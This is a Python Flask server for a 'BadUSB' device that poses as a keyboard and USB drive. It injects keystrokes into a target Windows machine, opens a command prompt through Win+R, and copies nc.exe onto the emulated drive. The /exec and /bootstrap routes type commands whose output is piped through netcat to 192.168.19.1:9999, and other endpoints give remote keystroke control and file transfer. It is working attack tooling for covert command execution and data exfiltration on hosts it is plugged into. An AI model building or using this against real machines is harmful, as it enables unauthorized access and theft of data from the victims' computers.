#!/usr/bin/env python3
"""VPN BadUSB — Bidirectional HID Bridge with mass storage and output capture."""

import os
import json
import time
import secrets
import subprocess
from flask import Flask, request, jsonify, Response
from flask_socketio import SocketIO, emit

import hid
import mass_storage
from output_collector import OutputCollector

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY') or secrets.token_hex(24)
socketio = SocketIO(app, async_mode='threading', cors_allowed_origins='*')

collector = OutputCollector()

# Session config — persists until restart
config = {
    "drive_letter": "E",
    "default_capture": "rndis",
}


# --- Config ---

@app.route('/config', methods=['GET', 'POST'])
def handle_config():
    if request.method == 'POST':
        data = request.get_json(force=True)
        for key in ('drive_letter', 'default_capture'):
            if key in data:
                config[key] = data[key]
        return jsonify(config)
    return jsonify(config)


# --- HID Typing (preserved API) ---

@app.route('/type', methods=['GET', 'POST'])
def handle_type():
    if request.method == 'POST':
        data = request.get_json(force=True)
        text = data.get('text', '')
        delay = data.get('delay', hid.TYPE_DELAY)
    else:
        text = request.args.get('text', '')
        delay = float(request.args.get('delay', hid.TYPE_DELAY))
    if not text:
        return jsonify({"error": "no text provided"}), 400
    typed, skipped = hid.type_text(text, delay)
    return jsonify({"typed": typed, "skipped": skipped})


@app.route('/key', methods=['GET', 'POST'])
def handle_key():
    if request.method == 'POST':
        data = request.get_json(force=True)
        name = data.get('name', '').lower()
    else:
        name = request.args.get('name', '').lower()
    ok, result = hid.send_special(name)
    if ok:
        return jsonify({"sent": result})
    return jsonify({"error": f"unknown key: {name}", "available": result}), 400


# --- Command Execution ---

@app.route('/exec', methods=['POST'])
def handle_exec():
    data = request.get_json(force=True)
    cmd = data.get('cmd', '')
    if not cmd:
        return jsonify({"error": "no cmd provided"}), 400

    capture = data.get('capture', config['default_capture'])
    delay = data.get('delay', 0.03)
    dl = config['drive_letter']

    since_id = collector.get_latest_id()

    if capture == 'rndis':
        full_cmd = f'{cmd} | {dl}:\\nc.exe 192.168.19.1 9999\n'
    elif capture == 'drive':
        full_cmd = f'{cmd} > {dl}:\\out.txt\n'
    else:
        full_cmd = cmd if cmd.endswith('\n') else cmd + '\n'

    hid.type_text(full_cmd, delay)
    return jsonify({"status": "sent", "output_since": since_id, "typed_cmd": full_cmd.strip()})


# --- Output ---

@app.route('/output', methods=['GET'])
def handle_output():
    since = int(request.args.get('since', 0))
    wait = float(request.args.get('wait', 0))
    if wait > 0:
        entries = collector.wait_for_output(since, timeout=wait)
    else:
        entries = collector.get_output(since)
    return jsonify({"lines": entries, "latest_id": collector.get_latest_id()})


@app.route('/output/stream')
def handle_output_stream():
    since = int(request.args.get('since', 0))

    def generate():
        sid = since
        while True:
            entries = collector.wait_for_output(sid, timeout=5)
            for entry in entries:
                yield f"data: {json.dumps(entry)}\n\n"
                sid = entry["id"]
            if not entries:
                yield f": keepalive\n\n"

    return Response(generate(), mimetype='text/event-stream',
                    headers={'Cache-Control': 'no-cache', 'X-Accel-Buffering': 'no'})


@app.route('/output', methods=['DELETE'])
def handle_output_clear():
    collector.clear()
    return jsonify({"status": "cleared"})


# --- Mass Storage ---

@app.route('/drive/files', methods=['GET'])
def handle_drive_list():
    try:
        files = mass_storage.list_files()
        return jsonify({"files": files})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route('/drive/files/<name>', methods=['GET'])
def handle_drive_download(name):
    try:
        data = mass_storage.read_file(name)
        if data is None:
            return jsonify({"error": "file not found"}), 404
        return Response(data, mimetype='application/octet-stream',
                        headers={'Content-Disposition': f'attachment; filename={name}'})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route('/drive/files/<name>', methods=['POST'])
def handle_drive_upload(name):
    try:
        data = request.get_data()
        mass_storage.write_file(name, data)
        return jsonify({"status": "uploaded", "name": name, "size": len(data)})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route('/drive/files/<name>', methods=['DELETE'])
def handle_drive_delete(name):
    try:
        ok = mass_storage.delete_file(name)
        if ok:
            return jsonify({"status": "deleted", "name": name})
        return jsonify({"error": "file not found"}), 404
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# --- Bootstrap ---

@app.route('/bootstrap', methods=['POST'])
def handle_bootstrap():
    data = request.get_json(force=True) if request.is_json else {}
    delay = data.get('delay', 0.05)
    dl = config['drive_letter']

    steps = []

    # Check if nc.exe is on the shared drive
    try:
        files = mass_storage.list_files()
        has_nc = any(f['name'].lower() == 'nc.exe' for f in files)
        if not has_nc:
            nc_path = os.path.join(os.path.dirname(__file__), '..', 'tools', 'nc.exe')
            alt_path = '/opt/vpn-badusb/tools/nc.exe'
            src = nc_path if os.path.exists(nc_path) else alt_path
            if os.path.exists(src):
                with open(src, 'rb') as f:
                    mass_storage.write_file('nc.exe', f.read())
                steps.append("deployed nc.exe to shared drive")
            else:
                steps.append("warning: nc.exe not found in tools/")
        else:
            steps.append("nc.exe already on shared drive")
    except Exception as e:
        steps.append(f"drive error: {e}")

    # Open cmd on target
    since_id = collector.get_latest_id()
    hid.send_special('win+r')
    time.sleep(1.5)
    hid.type_text('cmd\n', delay)
    time.sleep(2)
    steps.append("opened cmd via Win+R")

    # Test round-trip
    hid.type_text(f'{dl}:\\nc.exe 192.168.19.1 9999 < echo bootstrap-ok\n', delay)
    steps.append("sent connectivity test")

    return jsonify({
        "status": "bootstrap sent",
        "steps": steps,
        "output_since": since_id,
        "note": f"check GET /output?since={since_id}&wait=5 for response",
    })


# --- Interactive Keyboard Streaming ---

@socketio.on('keystroke')
def handle_keystroke(data):
    msg_type = data.get('type', 'key')
    if msg_type == 'text':
        typed, skipped = hid.type_text(data.get('text', ''), data.get('delay', 0.01))
        emit('ack', {'typed': typed, 'skipped': skipped})
    elif msg_type == 'special':
        ok, result = hid.send_special(data.get('name', ''))
        emit('ack', {'sent': result if ok else None, 'error': None if ok else f'unknown: {data.get("name")}'})
    elif msg_type == 'key':
        char = data.get('name', '')
        if len(char) == 1 and char in hid.KEYMAP:
            keycode, modifier = hid.KEYMAP[char]
            hid.send_key(keycode, modifier)
            emit('ack', {'sent': char})
        else:
            ok, result = hid.send_special(char)
            emit('ack', {'sent': result if ok else None})


@socketio.on('connect')
def handle_ws_connect():
    emit('status', {'connected': True, 'hid': os.path.exists(hid.HID_DEVICE)})


# Background thread to push output to WebSocket clients
def output_pusher():
    sid = 0
    while True:
        entries = collector.wait_for_output(sid, timeout=2)
        for entry in entries:
            socketio.emit('output', entry)
            sid = entry['id']


# --- Gadget Profile ---

PROFILE_FILE = "/var/lib/vpn-badusb/current-profile"
AVAILABLE_PROFILES = ["hid-only", "hid-storage", "full"]


def get_current_profile():
    try:
        with open(PROFILE_FILE) as f:
            return f.read().strip()
    except FileNotFoundError:
        return "full"


@app.route('/gadget/profile', methods=['GET', 'POST'])
def handle_gadget_profile():
    if request.method == 'GET':
        return jsonify({
            "profile": get_current_profile(),
            "available": AVAILABLE_PROFILES,
        })

    data = request.get_json(force=True)
    name = data.get('name', '').strip()
    if name not in AVAILABLE_PROFILES:
        return jsonify({"error": f"unknown profile: {name}", "available": AVAILABLE_PROFILES}), 400

    current = get_current_profile()
    if name == current:
        return jsonify({"status": "ok", "profile": name, "note": "already active"})

    try:
        result = subprocess.run(
            ["sudo", "gadget-switch", name],
            capture_output=True, text=True, timeout=15,
        )
        if result.returncode == 0:
            return jsonify({
                "status": "ok",
                "from": current,
                "profile": name,
                "note": "USB reconnect triggered on target host",
            })
        return jsonify({"error": "switch failed", "detail": result.stderr.strip()}), 500
    except subprocess.TimeoutExpired:
        return jsonify({"error": "switch timed out"}), 500


# --- Status ---

@app.route('/status')
def status():
    hid_ok = os.path.exists(hid.HID_DEVICE)
    drive_ok = os.path.exists(mass_storage.IMAGE_PATH)
    return jsonify({
        "status": "ok" if hid_ok else "degraded",
        "hid_device": hid.HID_DEVICE,
        "hid_available": hid_ok,
        "mass_storage": drive_ok,
        "collector_running": collector._running,
        "output_lines": collector.get_latest_id(),
        "config": config,
        "gadget_profile": get_current_profile(),
    })


if __name__ == '__main__':
    collector.start()
    import threading as _t
    _t.Thread(target=output_pusher, daemon=True).start()
    socketio.run(app, host='0.0.0.0', port=5000, allow_unsafe_werkzeug=True)
